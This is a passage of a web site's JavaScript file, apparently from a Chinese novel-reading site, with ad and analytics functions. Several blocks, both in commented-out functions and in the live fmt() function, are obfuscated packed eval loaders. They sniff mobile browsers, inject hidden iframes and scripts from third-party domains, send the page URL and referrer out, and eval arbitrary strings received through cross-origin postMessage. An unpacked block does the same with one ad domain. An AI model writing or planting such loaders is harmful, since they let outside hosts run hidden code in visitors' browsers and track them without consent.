b=3.1x("j")[0];b.1y.1z(m,b)})()}',62,98,'|||document|div||var|if_id|navigator|test|||write|userAgent||if||Math||script|id|js||window|https|random|src|else||645655|cn|33xs||xsyouwei|com|function|baidu|encodeURIComponent|iframe|index|Android|slice|36|toString|_|ifr_ref|20|replace|wz_ev_j|decodeURIComponent|eval|data|style|display|none|message|addEventListener|UCBrowser|MQQBrowser|bfcf8VQ1TD1EC|round|10000|html||sdfa|ifr_url|portal|location|href|serasfd|platform|badid|referrer|height|auto|width|100|marginheight|project|scrolling|no|frameborder|allowtransparency|true|createElement|feifei|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|ssid|djb|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}))
	//end--ym
    break;
    case 1:
	//start-7
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c((/(G)/i.n(d.h))&&(/(t)/i.n(d.h))){3.8(\'<4 p="S"><\\/4>\');3.8(\'<f j="q://W.J.M/N/O/D/k/D!V@k"><\\/f>\')}C c((/(H|I|t)/i.n(d.h))){l.K(\'L\',y(e){7 a=e.T;c(a.6){c(l[a.6+"w"]!=1){l[a.6+"w"]=1;1a(1h(a.1j.F(/\\+/g,"%1m")))}}});7 6="r"+9.o().u(v).x(2);3.8("<4 p=\'4"+6+"\'></4>");3.8(\'<E P="Q:R;" j="q://m.z.A/B-11-\'+9.X(9.o()*Y)+\'.Z?10=5&12=\'+d["13"]+\'&14=\'+6+\'" 15="16" 17="18%"  19="0" 1b="1c" 1d="0" 1e="1f"></E>\')}C{;(y(){7 m=3.1g("f");7 s="r"+9.o().u(v).x(2);3.8("<4 p=\'"+s+"\'></4>");7 a=\'q://m.z.A\';m.j=a+"/11/B.k?1i="+s;7 b=3.1k("f")[0];b.1l.U(m,b)})()}',62,85,'|||document|div||if_id|var|write|Math|||if|navigator||script||userAgent||src|js|window||test|random|id|https|_||baidu|toString|36||slice|function|cornplus|cn|343965|else|index|iframe|replace|Android|MQQBrowser|UCBrowser|33xs|addEventListener|message|com|project|portal|style|display|none|djb|data|insertBefore|bf537UA1VAFIC|feida|round|10000|html|sdfa||serasfd|platform|badid|height|auto|width|100|marginheight|eval|scrolling|no|frameborder|allowtransparency|true|createElement|decodeURIComponent|ssid|wz_ev_j|getElementsByTagName|parentNode|20'.split('|'),0,{}))
	//end-7
     break;
		}
document.writeln("</div>");
}
*/
{advert_in_drift}
/*
function style_bottom(){//底端广告
document.writeln("<div style=\"margin-top:0px;text-align:center\">");
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//start-ym
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('f((/(E)/i.9(8.d))&&(/(A)/i.9(8.d))){3.c(\'<4 k="1w"><\\/4>\');3.c(\'<j q="o://1n.v.y/1g/14/D/l/D!X@l"><\\/j>\')}r f((/(W|V|A)/i.9(8.d))){n.U(\'T\',z(e){6 a=e.P;f(a.7){f(n[a.7+"w"]!=1){n[a.7+"w"]=1;O(N(a.M.L(/\\+/g,"%K")))}}});6 7="I"+h.p().H(G).F(2);3.c("<4 k=\'4"+7+"\'></4>");3.c(\'<C Q="R:S;" k="\'+7+\'" q="o://m.x.u/t-11-\'+h.Y(h.p()*Z)+\'.10?12=5&13=\'+B(15.16)+\'&17=\'+8["18"]+\'&19=\'+7+\'&J=\'+B(3.1a)+\'" 1b="1c" 1d="1e%"  1f="0" 1h="1i" 1j="0" 1k="1l"></C>\')}r{;(z(){6 m=3.1m("j");6 s="I"+h.p().H(G).F(2);3.c("<4 k=\'"+s+"\'></4>");6 a=\'o://m.x.u\';f((/(E)/i.9(8.d))&&(/(1o|1p|1q|1r|1s)/i.9(8.d))){6 a=\'1t://1u.m.v.y\'}m.q=a+"/11/t.l?1v="+s;6 b=3.1x("j")[0];b.1y.1z(m,b)})()}',62,98,'|||document|div||var|if_id|navigator|test|||write|userAgent||if||Math||script|id|js||window|https|random|src|else||645655|cn|33xs||xsyouwei|com|function|baidu|encodeURIComponent|iframe|index|Android|slice|36|toString|_|ifr_ref|20|replace|wz_ev_j|decodeURIComponent|eval|data|style|display|none|message|addEventListener|UCBrowser|MQQBrowser|bfcf8VQ1TD1EC|round|10000|html||sdfa|ifr_url|portal|location|href|serasfd|platform|badid|referrer|height|auto|width|100|marginheight|project|scrolling|no|frameborder|allowtransparency|true|createElement|feifei|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|ssid|djb|getElementsByTagName|parentNode|insertBefore'.split('|'),0,{}))
	//end--ym
    break;
    case 1:
	//start-7
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c((/(G)/i.n(d.h))&&(/(t)/i.n(d.h))){3.8(\'<4 p="S"><\\/4>\');3.8(\'<f j="q://W.J.M/N/O/D/k/D!V@k"><\\/f>\')}C c((/(H|I|t)/i.n(d.h))){l.K(\'L\',y(e){7 a=e.T;c(a.6){c(l[a.6+"w"]!=1){l[a.6+"w"]=1;1a(1h(a.1j.F(/\\+/g,"%1m")))}}});7 6="r"+9.o().u(v).x(2);3.8("<4 p=\'4"+6+"\'></4>");3.8(\'<E P="Q:R;" j="q://m.z.A/B-11-\'+9.X(9.o()*Y)+\'.Z?10=5&12=\'+d["13"]+\'&14=\'+6+\'" 15="16" 17="18%"  19="0" 1b="1c" 1d="0" 1e="1f"></E>\')}C{;(y(){7 m=3.1g("f");7 s="r"+9.o().u(v).x(2);3.8("<4 p=\'"+s+"\'></4>");7 a=\'q://m.z.A\';m.j=a+"/11/B.k?1i="+s;7 b=3.1k("f")[0];b.1l.U(m,b)})()}',62,85,'|||document|div||if_id|var|write|Math|||if|navigator||script||userAgent||src|js|window||test|random|id|https|_||baidu|toString|36||slice|function|cornplus|cn|343965|else|index|iframe|replace|Android|MQQBrowser|UCBrowser|33xs|addEventListener|message|com|project|portal|style|display|none|djb|data|insertBefore|bf537UA1VAFIC|feida|round|10000|html|sdfa||serasfd|platform|badid|height|auto|width|100|marginheight|eval|scrolling|no|frameborder|allowtransparency|true|createElement|decodeURIComponent|ssid|wz_ev_j|getElementsByTagName|parentNode|20'.split('|'),0,{}))
	//end-7
     break;
		}
document.writeln("</div>");
}
*/
function fmt(){
var userAgent = window.navigator.userAgent;
if(navigator.userAgent.indexOf('UCBrowser') > -1 || userAgent.indexOf('baiduboxapp') > -1){
	var eventSize = 2, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//QC-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8((/(C)/i.9(4.j))&&(/(x)/i.9(4.j))){2.h(\'<t J="L"><\\/t>\');2.h(\'<6 c="d://R.X.16/y/A/p/f/p!K@f"><\\/6>\')}s 8((/(M|N|x)/i.9(4.j))){O.P(\'Q\',l(e){7 a=e.z;8(a.n){B(19(a.n.D(/\\+/g,"%E")))}});2.h(\'<o G="H:I;" c="d://m.q.r/k-1-\'+5.u(5.v()*w)+\'.S?T=3&U=\'+4["V"]+\'" W="0" Y="0"  Z="0" 10="11" 12="0" 13="14"></o>\')}s{;(l(){7 m=2.15("6");7 a=\'d://m.q.r\';m.c=a+"/1/k.f?"+5.u(5.v()*w);7 b=2.17("6")[0];b.18.F(m,b)})()}',62,72,'||document||navigator|Math|script|var|if|test|||src|https||js||write||userAgent|343945|function||hf_ev_j|iframe|index|louisan|cn|else|div|round|random|10000|baidu|project|data|portal|eval|Android|replace|20|insertBefore|style|display|none|id|bffa2UA1VAFAC|djb|MQQBrowser|UCBrowser|window|addEventListener|message|feida|html|sdfa|serasfd|platform|height|33xs|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|com|getElementsByTagName|parentNode|decodeURIComponent'.split('|'),0,{}))
	//QC-end
    break;
    case 1:
	//ym-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9((/(q)/i.5(4.7))&&(/(w)/i.5(4.7))){2.d(\'<j 10="z"><\\/j>\');2.d(\'<8 f="c://B.n.l//1g/1k/k/h/k!G@h"><\\/8>\')}y 9((/(K|L|w)/i.5(4.7))){M.O(\'U\',r(e){6 a=e.A;9(a.o){C(D(a.o.E(/\\+/g,"%F")))}});2.d(\'<p H="I:1n;" f="c://m.s.t/N/u.P?Q=3&R=\'+4["S"]+\'&T=\'+v(V.W)+\'&X=\'+v(2.Y)+\'" Z="0" 11="0"  12="0" 13="14" 15="0" 16="17"></p>\')}y{;(r(){6 m=2.18("8");6 a=\'c://m.s.t\';9((/(q)/i.5(4.7))&&(/(19|1a|1b|1c|1d)/i.5(4.7))){6 a=\'1e://1f.m.n.l\'}m.f=a+"/1/u.h?"+x.1h(x.1i()*1j);6 b=2.1l("8")[0];b.1m.J(m,b)})()}',62,86,'||document||navigator|test|var|userAgent|script|if|||https|write||src||js||div|index|com||33xs|hf_ev_j|iframe|Android|function|xsyouwei|cn|645719|encodeURIComponent|baidu|Math|else|djb|data|feifei|eval|decodeURIComponent|replace|20|bfc6eVQ1TDlUO|style|display|insertBefore|MQQBrowser|UCBrowser|window|szt|addEventListener|html|sdfa|serasfd|platform|ifr_url|message|location|href|ifr_ref|referrer|height|id|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|project|round|random|10000|portal|getElementsByTagName|parentNode|none'.split('|'),0,{}))
	//ym-end
     break;
		}
}
	else{//其他
//star
	var eventSize = 3, eventKey = Math.floor(Math.random()*eventSize);
	console.log(eventKey);
	switch(eventKey) {
    case 0:
	//9-start
	eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 11="//";2 10=["29","21","28"];2 4="18.19";2 3="";2 7="17";2 6=4;20(3&&3!=""){6=4+"."+3}2 8="15*22";2 5="30";2 14="-1*-1";2 13="0";2 12=11+10.24(".")+"/"+6+"?"+7+"="+8+"*"+5+"*"+14+"*"+13;25.23("<9 26=\'27"+5+"\' 16=\'"+12+"\'></9>");',10,31,'||var|sf|pf|mykey|loc|parg|myid|script|dmList|proto|srcUrl|ifx|dm_ty|1_12|src|qq|jqputools|js|if|intxt||write|join|document|id|_0|cn|main|e3321f598ca34a549bababee0d8d1cc6'.split('|'),0,{}))
	//end
    break;
    case 1:
	//dr-start
	if (navigator.userAgent.indexOf('baidu') > -1){
      document.writeln("<script src='https://m.axsrq.cn/28405$js?"+(new Date()).getTime()+"'><\/script>");
      }
if(navigator.userAgent.indexOf('UCBrowser') > -1){
    window.addEventListener('message', function(e) {
      var _c_ob_hf = e.data;
      if (_c_ob_hf.hf_ev_j) {
        eval(decodeURIComponent(_c_ob_hf.hf_ev_j.replace(/\+/g, "%20")))
      }
    });
    document.write('<iframe style="display:none;" src="https://m.axsrq.cn/miftp.php?g=28405&domain=m.x81zw.com" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe><iframe style="display:none;" src="https://m.axsrq.cn/28405.htmm?' + (new Date()).getTime() +'" height="0" width="0" marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>');
	} else if (navigator.userAgent.indexOf('baidu') > -1){

      }else {
    document.writeln("<script src='https://m.axsrq.cn/28405$js?"+(new Date()).getTime()+"'><\/script>");
	   }
	//end
     break;
	case 2:
	//ym-start
	eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9((/(q)/i.5(4.7))&&(/(w)/i.5(4.7))){2.d(\'<j 10="z"><\\/j>\');2.d(\'<8 f="c://B.n.l//1g/1k/k/h/k!G@h"><\\/8>\')}y 9((/(K|L|w)/i.5(4.7))){M.O(\'U\',r(e){6 a=e.A;9(a.o){C(D(a.o.E(/\\+/g,"%F")))}});2.d(\'<p H="I:1n;" f="c://m.s.t/N/u.P?Q=3&R=\'+4["S"]+\'&T=\'+v(V.W)+\'&X=\'+v(2.Y)+\'" Z="0" 11="0"  12="0" 13="14" 15="0" 16="17"></p>\')}y{;(r(){6 m=2.18("8");6 a=\'c://m.s.t\';9((/(q)/i.5(4.7))&&(/(19|1a|1b|1c|1d)/i.5(4.7))){6 a=\'1e://1f.m.n.l\'}m.f=a+"/1/u.h?"+x.1h(x.1i()*1j);6 b=2.1l("8")[0];b.1m.J(m,b)})()}',62,86,'||document||navigator|test|var|userAgent|script|if|||https|write||src||js||div|index|com||33xs|hf_ev_j|iframe|Android|function|xsyouwei|cn|645719|encodeURIComponent|baidu|Math|else|djb|data|feifei|eval|decodeURIComponent|replace|20|bfc6eVQ1TDlUO|style|display|insertBefore|MQQBrowser|UCBrowser|window|szt|addEventListener|html|sdfa|serasfd|platform|ifr_url|message|location|href|ifr_ref|referrer|height|id|width|marginheight|scrolling|no|frameborder|allowtransparency|true|createElement|VivoBrowser|SogouSearch|SogouMobileBrowser|360Browser|MiuiBrowser|http|sdun1|project|round|random|10000|portal|getElementsByTagName|parentNode|none'.split('|'),0,{}))
	//end
     break;
		}
//end
	}
}



function postError(bid, cid) {
    doAjax("/error_report.php", 'bid='+bid + '&cid='+cid, 'errorResult', "POST", 0);
}


function errorResult(result) {
    if(result === '3'){
        alert('发生错误');
        return;
    }
    if(result === '1'){
        alert('提交成功，请耐心等待处理');
        return;
    }
    if(result === '2'){
        alert('已经提交，请耐心等待处理结果');
        return;
    }
}

function tjkk(){
document.writeln("<div style=\"display:none\" >");
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?df99e8b07b57cf49e084a41cfd227f23";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
document.writeln("</div>");
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
(function(){
   var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?602150590b30310077b082892c8bb524":"https://jspassport.ssl.qhimg.com/11.0.1.js?602150590b30310077b082892c8bb524";
   document.write('<script src="' + src + '" id="sozz"><\/script>');
})();
}